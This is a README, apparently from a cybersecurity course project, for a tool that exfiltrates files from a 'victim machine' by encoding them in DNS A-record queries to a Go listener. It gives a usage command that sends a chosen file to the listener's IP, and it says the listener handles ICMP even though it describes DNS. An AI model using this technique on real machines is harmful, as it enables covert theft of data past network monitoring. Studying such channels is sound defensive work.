# DNS Extraction

The objective is to build an extractor using the DNS protocol.
The listener is built using go, see the root README to build it

## Let's run it !
The [emitter script](https://github.com/Anthony-Jhoiro/cours-cyber-extractor/blob/main/dns/emiter/emiter.sh) needs to be sent to the target machine. 
It doesn't matter how.

Run the listener with `./dns-listener`. It requires `sudo` privileges. 

Run the emitter on the victim machine and specify the ip of the listener as first argument and the file to extract as the second. 
(ex: `./emitter.sh 10.1.1.15 /path/to/my/file`)

Then you should see logs arrive in the listener process. When it says `Recieved File`, the file has been received. 
That's mean that the file has been completely extracted and is now located in the `results` directory with a `.raw` 
(warning, if the listener was ran with administrator privileges, you will need to change the access on the file !).

## How it works

### The emitter

The emitter installed of the victim machine will send repetitive dns requests for A record on the host machine.
Each request will have the following format :
![A record structure](a_record_structure.png)

Each A record is split into 3 sections.

1. The payload. The par t of the file which is sent in this message in hexadecimal.
2. The request index. There is no delay between each request so to ensure the order, we add an index to each message
3. The identifier of the file. The identifier is generated to favor uniqueness

Whe the whole file is sent, a stop message is sent with the same id as the package, 0 as the request index
and `STOP` as the payload.

### The listener

The listener listen for any icmp request. For non Stop message, it save the file in the `results` directory. It keeps
one file per request.
Whe the stop request is received. All the files are read and concatenate into a single file that will be located in
the `results` directory.

*Theoretically*, any number of file can be received at the same time as long as they can be handled by the listener.



